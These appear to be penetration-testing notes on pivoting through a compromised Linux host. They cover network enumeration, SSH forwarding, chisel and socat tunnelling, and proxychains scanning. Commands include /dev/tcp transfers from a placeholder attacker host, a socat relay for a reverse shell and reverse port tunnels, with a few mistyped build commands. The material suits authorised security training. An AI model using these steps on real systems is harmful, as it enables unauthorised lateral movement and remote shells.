# Pivoting in Unix/Linux

## Pivoting in Unix/Linux

We may be in a situation where we are in an operating system that has more than one network interface, this could be physical, virtual, or even a container environment.&#x20;

## Pivoting Enumeration

### Enumerating the ARP Table

The ARP table contains IP addresses of hosts that the target has interacted with recently. We can enumerate it with:

```
arp -a
```

### Enumerating Name Resolution

On Unix/Linux systems, we can find the name resolution mappings in:

```
/etc/hosts
```

On Unix/Linux there is a file that identifies local DNS servers:

```
/etc/resolv.conf
nmcli dev show
```

### Enumerating Network Interface Cards (NICs)

First, we must enumerate the subnets that are on the operating system, we can do this with **ipconfig** or **ip** commands:

```
ifconfig
ip a
```

Then we must review the output:

```
enp0s10f1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.10  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::7e8c:6a7c:faf1:274c  prefixlen 64  scopeid 0x20<link>
        ether 54:e1:ad:79:27:80  txqueuelen 1000  (Ethernet)
        RX packets 7463931  bytes 10268193539 (10.2 GB)
        RX errors 0  dropped 11149  overruns 0  frame 0
        TX packets 3581258  bytes 306664252 (306.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 16  memory 0xec200000-ec220000  

enp0s20f2: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 20.20.20.10  netmask 255.255.255.0  broadcast 20.20.20.255
        inet6 fe80::7e8c:6a7c:faf1:274c  prefixlen 64  scopeid 0x20<link>
        ether 54:e1:ad:79:27:80  txqueuelen 1000  (Ethernet)
        RX packets 7463931  bytes 10268193539 (10.2 GB)
        RX errors 0  dropped 11149  overruns 0  frame 0
        TX packets 3581258  bytes 306664252 (306.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 16  memory 0xec200000-ec220000  
```

In this example we see more than one network interface, however, we don't have access to the other network \`20.20.0.10\`. On the victim machine, we can perform a ping sweep to use ICMP and see which hosts are up and running.&#x20;

### Enumerating Hosts

```
fping -a -g 20.20.20.0/24 2>/dev/null
nmap -sn 20.20.20.0/24


# You can use either {1..255} or `seq 1 255`

for i in {1..254} ;do (ping 20.20.20.$i -c 1 -w 5  >/dev/null && echo "20.20.20.$i" &) ;done
for i in {1..255}; do (ping -c 1 20.20.20.${i} | grep "bytes from" &); done
for i in {1..255}; do ping -c 1 172.20.0.$i; done | grep 'ttl='
for i in `seq 1 255`; do (ping -c 1 172.20.0.$i > /dev/null && echo "172.20.0.$i is up" &); done

```

Another host has been found \`20.20.20.15\` and has ports 80 and 22 open, but because we can not access this machine, we have to use the machine 10.10.10.10 to make a reverse port forwarding of the 20.20.20.20:80 and 20.20.20.20:22 to the ports of the attacker machine. This is where pivoting comes into place.

Here for the notes, we will have this special nomenclature:

* 20.20.20.15 -> **victim machine**
* 10.10.10.10 -> **pivoting machine**
* attacker -> **attacker machine**

### **Enumerating Ports**

If you found a host, you may want to do a port scan:

```
for port in {1..30}; do echo > /dev/tcp/10.10.10.101/$port && echo "port $port is open";done 2>/dev/null
for port in `seq 1 30`; do echo > /dev/tcp/10.10.10.101/$port && echo "port $port is open";done 2>/dev/null
```

## Pivoting Example

127.0.0.1:3000 <- Aogiri(10.10.10.101):3000 <- Kaneki\_pc(172.20.0.150):3000 <- Gogs(172.18.0.2):3000

Let’s try that, first SSH into 10.10.10.101 then forward port 3000 from 172.18.0.2 through kaneki-pc.

```bash
kaneki@Aogiri:~$ ssh -L 3000:172.18.0.2:3000 kaneki_pub@172.20.0.150
```

Then forward from Aogiri to our host (127.0.0.1):

```bash
kali@kali:~$ ssh -L 3000:127.0.0.1:3000 -i kaneki.backup kaneki@10.10.10.101
```

## Pivoting with chisel

Get chisel and build it.

```
git clone https://github.com/jpillora/chisel
cd chisel
go blid -ldflags "-s -w" .
upx brute chisel
```

Send the chisel binary to the pivoting machine

* On attacker machine

```
md5sum chisel
nc -nlvp 443 < chisel
```

* On pivoting machine

```
cat > chisel < /dev/tcp/<attacker ip>/443
md5sum chisel
chmod +x chisel
```

* Create reverse port forwarding with the victim machine ports to bind attacker machine ports
  * On attacker machine

```
./chisel server --reverse -p 1234
```

* On pivoting machine

```
./chisel client <attacker ip>:1234 R:127.0.0.1:80:<victim ip>:80 R:127.0.0.1:222:<victim ip>:22
```

Now the attacker can check the web app on `localhost:80` or use `ssh 127.0.0.1 -p 222`

## Pivoting with socat

Get socat static binary:

```
wget https://github.com/aledbf/socat-static-binary/releases/download/v.0.0.1/socat-linux-amd64
```

Send socat to pivoting machine:

* On attacker machine

```
md5sum socat
nc -nlvp 443 < socat
```

* On pivoting machine

```
cat > socat < /dev/tcp/<attacker ip>/443
md5sum socat
chmod +x socat
```

Prepare the attacker machine for listening:

```
nc -nlvp 7979
```

Tunnel TCP data for a reverse shell from the victim to the attacker:

* On Pivoting Machine

```
./socat TCP-LISTEN:4545,fork tcp:<attacker ip>:7979 &
```

We should have a reverse shell.

## Pivoting with SSH

#### SOCKS Proxy

```
ssh -D8080 [user]@[host]

ssh -N -f -D 9000 [user]@[host]
-f : ssh in background
-N : do not execute a remote command
```

Cool Tip: Konami SSH Port forwarding

```
[ENTER] + [~C]
-D 1090
```

#### Local Port Forwarding

```
ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]
```

#### Remote Port Forwarding

```
ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
ssh -R 3389:10.1.1.224:3389 root@10.11.0.32
```

## Proxychains

### SSH Dynamic Port Forwarding

If the target has more than one NIC and more than one network subnet than we can use proxychains.

In Kali edit the proxychains configuration file:

```
sudo vim /etc/proxychains.conf
```

Add this lines:

```
[ProxyList]
socks4 127.0.0.1 8080
```

Perform a dynamic port forwarding to our port 8080

```
sudo ssh -N -D 127.0.0.1:8080 username@<target-IP>
```

Then scan with nmap and specify a TCP scan with `-sT` and don't use `ICMP` with `-Pn`.

```
proxychains nmap -p- -sT -Pn <target-Second-Interface-IP>
```



